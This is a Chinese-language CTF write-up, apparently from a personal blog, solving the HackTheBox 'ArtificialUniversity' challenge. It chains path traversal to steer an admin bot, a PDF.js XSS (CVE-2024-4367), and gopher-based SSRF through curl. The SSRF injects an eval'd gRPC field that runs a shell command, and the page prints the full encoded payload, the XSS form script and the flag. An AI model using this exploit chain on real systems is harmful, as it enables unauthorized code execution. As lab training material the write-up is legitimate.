@@ -1,0 +1,224 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ArtificialUniversity-writeup | Welcome to my blog</title><meta name="author" content="ForgottenRythm"><meta name="copyright" content="ForgottenRythm"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="不得不说，这个确实是insane难度的challenge，复杂的一批，还有各种坑 step1：注册并登录step2：注意到&#x2F;checkout路由的四个参数可控，并且不提供product_id的时候generate_payment_link会使用你提供的price来创建product，我们让它是负的，后面有用http:&#x2F;&#x2F;192.168.205.128:1337&#x2F;checkout?titl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ArtificialUniversity-writeup">
+<meta property="og:url" content="https://noobctfer.github.io/2024/12/08/ArtificialUniversity-writeup/index.html">
+<meta property="og:site_name" content="Welcome to my blog">
+<meta property="og:description" content="不得不说，这个确实是insane难度的challenge，复杂的一批，还有各种坑 step1：注册并登录step2：注意到&#x2F;checkout路由的四个参数可控，并且不提供product_id的时候generate_payment_link会使用你提供的price来创建product，我们让它是负的，后面有用http:&#x2F;&#x2F;192.168.205.128:1337&#x2F;checkout?titl">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://noobctfer.github.io/img/pika.png">
+<meta property="article:published_time" content="2024-12-08T15:35:52.000Z">
+<meta property="article:modified_time" content="2024-12-10T10:32:12.586Z">
+<meta property="article:author" content="ForgottenRythm">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://noobctfer.github.io/img/pika.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://noobctfer.github.io/2024/12/08/ArtificialUniversity-writeup/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'undefined')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ArtificialUniversity-writeup',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/background.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/pika.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-folder-open"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/categories/resources"><i class="fa-fw fas fa-download"></i><span> 资源</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/background.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/pika.png" alt="Logo"><span class="site-name">Welcome to my blog</span></a><a class="nav-page-title" href="/"><span class="site-name">ArtificialUniversity-writeup</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-folder-open"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/categories/resources"><i class="fa-fw fas fa-download"></i><span> 资源</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">ArtificialUniversity-writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-12-08T15:35:52.000Z" title="发表于 2024-12-08 23:35:52">2024-12-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-12-10T10:32:12.586Z" title="更新于 2024-12-10 18:32:12">2024-12-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/htb-challenge/">htb-challenge</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/2024/12/08/ArtificialUniversity-writeup/" data-flag-title="ArtificialUniversity-writeup"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="page"><div class="container" id="article-container"><p>不得不说，这个确实是insane难度的challenge，复杂的一批，还有各种坑</p>
+<p>step1：注册并登录<br>step2：注意到&#x2F;checkout路由的四个参数可控，并且不提供product_id的时候generate_payment_link会使用你提供的price来创建product，我们让它是负的，后面有用<br><a target="_blank" rel="noopener" href="http://192.168.205.128:1337/checkout?title=aaa&user_id=2&price=-9999&email=aaa">http://192.168.205.128:1337/checkout?title=aaa&amp;user_id=2&amp;price=-9999&amp;email=aaa</a><br>step3：&#x2F;checkout&#x2F;success 路由是一个比较重要的路由，它会检查你的order_id中price是否&lt;0(0是代码预先定义好的一个基准price,即amt_paid)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> amt_paid &gt;= order.price:</span><br><span class="line">		db_session.mark_order_complete(order_id)</span><br></pre></td></tr></table></figure>
+
+<p>然后如果小于0，启动一个botrunner，它会模拟firefox浏览器发起身份为admin的登录，然后浏览器中会存储admin的session，之后这个bot会访问一个url，这个url是可<br>被我们控制的<br>client.get(f”<a target="_blank" rel="noopener" href="http://127.0.0.1:1337/static/invoices/invoice_%7Bpayment_id%7D.pdf%22)%E4%B8%ADpaymentid%E5%8F%AF%E6%8E%A7%EF%BC%8C%E7%94%A8../%E5%8F%AF%E4%BB%A5%E8%BF%94%E5%9B%9E%E5%B9%B6%E4%B8%94%E8%AE%BF%E9%97%AEadmin%E8%B7%AF%E7%94%B1%E7%94%A8&a=%E6%9D%A5%E8%AE%A9'.pdf'%E6%88%90%E4%B8%BA%E6%97%A0%E6%84%8F%E4%B9%89%E7%9A%84%E8%AF%B7%E6%B1%82%E5%8F%82%E6%95%B0%E3%80%82%E8%BF%99%E4%B8%AA%E7%82%B9%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%9D%A5%E5%BC%95%E5%AF%BCbot%E8%AE%BF%E9%97%AE/admin/view-pdf%E3%80%82%E6%B3%A8%E6%84%8F%EF%BC%8C%E8%BF%99%E9%87%8C%E7%9A%84%E8%AE%BF%E9%97%AE%E5%B1%80%E9%99%90%E4%BA%8E127.0.0.1:1337,%E5%B9%B6%E4%B8%94%E9%80%9A%E8%BF%87bot%E8%AE%BF%E9%97%AE%E6%98%AF%E5%BF%85%E9%A1%BB%E7%9A%84%E7%8E%AF%E8%8A%82%EF%BC%8C%E5%90%A6%E5%88%99%E4%B8%8D%E4%BC%9A%E6%9C%89%E5%90%88%E6%B3%95session">http://127.0.0.1:1337/static/invoices/invoice_{payment_id}.pdf&quot;)中paymentid可控，用../可以返回并且访问admin路由用&amp;a=来让&#39;.pdf&#39;成为无意义的请求参数。这个点我们可以用来引导bot访问/admin/view-pdf。注意，这里的访问局限于127.0.0.1:1337,并且通过bot访问是必须的环节，否则不会有合法session</a></p>
+<p>step4：<br>view-pdf可以访问任意url的pdf，注意，从上一步的浏览器请求到这一步，我们始终在浏览器中，看到</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> send_file(pdf_data, mimetype=<span class="string">&quot;application/pdf&quot;</span>, as_attachment=<span class="literal">False</span>, download_name=<span class="string">&quot;document.pdf&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>attachment&#x3D;false意味着浏览器会直接打开这个pdf，firefox在126版本一下存在一个pdf导致xss的CVE-2024-4367，dockerfile是125，所以可以利用pdf来触发xss，这个xss只有在firefox会被触发，并且必须是bot访问<br>有一些问题：不能用fetch或者xhr去发送cookie，因为httponly，所以不能以admin登录，另外也不能直接fetch &#x2F;admin下的路由，因为你会发现firefox viewpdf触发xss的时候document.domain&#x3D;pdf.js，所以你的fetch会被cors阻止发送cookie，无论你怎么设置fetch的参数。这意味着，我们只能使用form表单的，写个js自动提交到&#x2F;admin路由，这种情况是会自动发送cookie的，区别于fetch，因此，用pdf触发xss后我们就可以让admin访问以下的路由</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@web.route(<span class="params"><span class="string">&quot;/admin/api-health&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api_health</span>():</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&quot;loggedin&quot;</span>) <span class="keyword">or</span> session.get(<span class="string">&quot;role&quot;</span>) != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">		<span class="keyword">return</span> redirect(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">		<span class="keyword">return</span> render_template(<span class="string">&quot;admin_api_health.html&quot;</span>, title=<span class="string">&quot;Admin panel - API health&quot;</span>, session=session)</span><br><span class="line"></span><br><span class="line">	url = request.form.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">		<span class="keyword">return</span> render_template(<span class="string">&quot;error.html&quot;</span>, title=<span class="string">&quot;Error&quot;</span>, error=<span class="string">&quot;Missing URL&quot;</span>), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">	status_code = get_url_status_code(url)</span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">&quot;admin_api_health.html&quot;</span>, title=<span class="string">&quot;Admin panel - API health&quot;</span>, session=session, status_code=status_code)</span><br></pre></td></tr></table></figure>
+<pre><code>为什么是这个路由？因为get_url_status_code(url)中调用了命令行的curl，向我们提供的url参数发起请求，这个是我们ssrf的关键步骤。为什么要绕一步不直接在
+</code></pre>
+<p>view-pdf中让bot访问这个路由？注意，这个路由只接受post方法，要么fetch，要么form，只有xss做得到，其它的路由不存在我们控制bot以admin身份发送post到这个路由的能力。curl支持相当多的协议，其中就有大家都熟悉的gopher，利用gopher我们几乎就做出来这个题了。</p>
+<pre><code>curl支持那么多协议，为什么只用gopher？直接file://行不行？这其实就是回显的问题，确实是可以访问的，但是我们看不到flag。想要在xss那一步用file://然后
+</code></pre>
+<p>outofband也是不行的，会被浏览器阻止访问本地文件。<br>    话说回来，怎么用gopher打？实际上作者留了后面eval在product_api的api.py中，其中给了 UpdateService和GenerateProduct，思路就是利用UpdateService向<br>self注入一个price_formula属性，然后触发generateproduct方法，触发eval。<br>    这里需要了解以下grpc协议，这是一个基于http2的远程方法调用，有点像java的rmi，服务端根据product.proto编译生成了两个文件product_xxxxx.py，这两个文件<br>同时被放在client，为的就是client能够识别正确的类型信息，并且知道怎么把需要发送的参数和方法序列化到tcp字节流当中。服务端的api.py就是注册了一个提供方法的<br>服务，client创建stub后利用服务端的方法名和相应的参数去调用相对应的方法。客户端实际上已经育一些路由访问了这些方法，但是，我们的第一步必须是给服务端的product对象添加一个price_formula，然后用generateproduct去eval它。DebugService调用了updateservice，当然，也可以直接调用updateservice，不过这两个方法<br>都是内部方法，不存在哪个路由可以直接调用的，即使是admin的路由。我们只能通过gopher去调用它，generateproduct可以用之前的方法直接让bot访问&#x2F;admin&#x2F;product-stream触发。<br>    现在，如何构造合适的tcp数据流是关键所在，也是最后一步。并没有支持http2的gopher的现成工具，人工去计算http2的字段是很复杂的，比http1要复杂的多，对我们<br>没有什么帮助，还极其容易出错。一个比较好的办法是wireshark抓包，然后抓取client http2的数据流，转化为字节数组并且用%编码，或者本地用nc在某个端口监听，去抓取字节发出去的grpc数据报。这里注意，grpc的协议中client发送完整http2数据后，server会返回一个随机的字节流，client要重复发送回去这个字节流才能得到响应，<br>但是在client发送http2数据后相应方法已经执行。gopher协议我们只能发一次数据，我们不能，但是也不需要获取响应，我们只需要eval执行我们的命令，把flag拷贝到<br>可读的位置，也就是eval(‘<strong>import</strong>(“os”).system(“cp &#x2F;flag* &#x2F;app&#x2F;store&#x2F;application&#x2F;static&#x2F;flag.txt”)’),就完成了最后一步。生成的数据流被放在gopher后面</p>
+<p>这个是不会变的，我已经写好放下面了（建议自己尝试生成）<br>gopher:&#x2F;&#x2F;<em>PRI%20%2A%20HTTP%2F2.0%0D%0A%0D%0ASM%0D%0A%0D%0A%00%00%00%04%00%00%00%00%00%00%00%00%04%01%00%00%00%00%00%00Z%01%04%00%00%00%01%83%86E%9Ab%BB%0F%25%A4J%FA%EC%3C%96%91%3B%8Bgs%10%AC</em>%2Cv%CD%B8%B6w1%0BA%8B%A0%E4%1D%13%9D%09%B8%D8%00%D8%7F_%8B%1Du%D0b%0D%26%3DLMedz%95%9A%CA%C9m%941%DC%2B%BC%B8%94%9A%CA%C8%B4%C7%60%2B%B2%EA%E0%40%02te%86M%835%05%B1%1F%00%00d%00%01%00%00%00%01%00%00%00%00_%0A%5D%0A%0Dprice_formula%12L%0AJ__import__%28%22os%22%29.popen%28%22cp%20%2Fflag%2A%20%2Fapp%2Fstore%2Fapplication%2Fstatic%2Fflag.txt%22%29    </p>
+<p>这个peiload应该被放在pdf中的url字段，被作为curl的参数，我在文件夹中也放了生成pdf的py代码和我生成的pdf，这个pdf是不会变的，可以直接用，生成方法：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python genpdf.py <span class="string">&quot;var form=document.createElement(&#x27;form&#x27;);form.action=&#x27;http://127.0.0.1:1337/admin/api-health&#x27;;form.method=&#x27;post&#x27;;var urlInput=document.createElement(&#x27;input&#x27;);urlInput.value=&#x27;gopher://127.0.0.1:50051/_PRI%20%2A%20HTTP%2F2.0%0D%0A%0D%0ASM%0D%0A%0D%0A%00%00%00%04%00%00%00%00%00%00%00%00%04%01%00%00%00%00%00%00Z%01%04%00%00%00%01%83%86E%9Ab%BB%0F%25%A4J%FA%EC%3C%96%91%3B%8Bgs%10%AC_%2Cv%CD%B8%B6w1%0BA%8B%A0%E4%1D%13%9D%09%B8%D8%00%D8%7F_%8B%1Du%D0b%0D%26%3DLMedz%95%9A%CA%C9m%941%DC%2B%BC%B8%94%9A%CA%C8%B4%C7%60%2B%B2%EA%E0%40%02te%86M%835%05%B1%1F%00%00d%00%01%00%00%00%01%00%00%00%00_%0A%5D%0A%0Dprice_formula%12L%0AJ__import__%28%22os%22%29.popen%28%22cp%20%2Fflag%2A%20%2Fapp%2Fstore%2Fapplication%2Fstatic%2Fflag.txt%22%29&#x27;;urlInput.name=&#x27;url&#x27;;form.appendChild(urlInput);document.body.appendChild(form);form.submit();&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>（(tip:some versions of curl dont support null bytes %00）</p>
+<p>flag：HTB{ol4_t4_ch41n5_ol4_t4_ch41n5_l4mp0un_t4_d15m4nd14_4l1_day}</p>
+</div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/pika.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">ForgottenRythm</div><div class="author-info-description">hacking is mindset</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/noobctfer"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/noobctfer" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/10/files/" title="一些有用的资源列表">一些有用的资源列表</a><time datetime="2024-12-10T10:56:37.000Z" title="发表于 2024-12-10 18:56:37">2024-12-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/10/vintage-writeup/" title="vintage-writeup">vintage-writeup</a><time datetime="2024-12-10T09:44:46.000Z" title="发表于 2024-12-10 17:44:46">2024-12-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/08/ArtificialUniversity-writeup/" title="ArtificialUniversity-writeup">ArtificialUniversity-writeup</a><time datetime="2024-12-08T15:35:52.000Z" title="发表于 2024-12-08 23:35:52">2024-12-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/08/JerryTok/" title="JerryTok-writeup">JerryTok-writeup</a><time datetime="2024-12-08T15:35:52.000Z" title="发表于 2024-12-08 23:35:52">2024-12-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/08/alert/" title="Alert-writeup">Alert-writeup</a><time datetime="2024-12-08T15:35:52.000Z" title="发表于 2024-12-08 23:35:52">2024-12-08</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
+  const option = null
+
+  const initValine = (el, path) => {
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyValine = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    const valineConfig = {
+      el: '#vcomment',
+      appId: 'A3w8iHUklSxlnechrHppSu55-gzGzoHsz',
+      appKey: '353fETJcLAQnsDCp9AdmMuCI',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      visitor: true,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || window.location.pathname
+    }
+
+    new Valine(valineConfig)
+  }
+
+  const loadValine = async (el, path) => {
+    if (typeof Valine === 'function') {
+      initValine(el, path)
+    } else {
+      await btf.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js')
+      initValine(el, path)
+    }
+  }
+
+  if (isShuoshuo) {
+    'Valine' === 'Valine'
+      ? window.shuoshuoComment = { loadComment: loadValine }
+      : window.loadOtherComment = loadValine
+    return
+  }
+
+  if ('Valine' === 'Valine' || !false) {
+    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
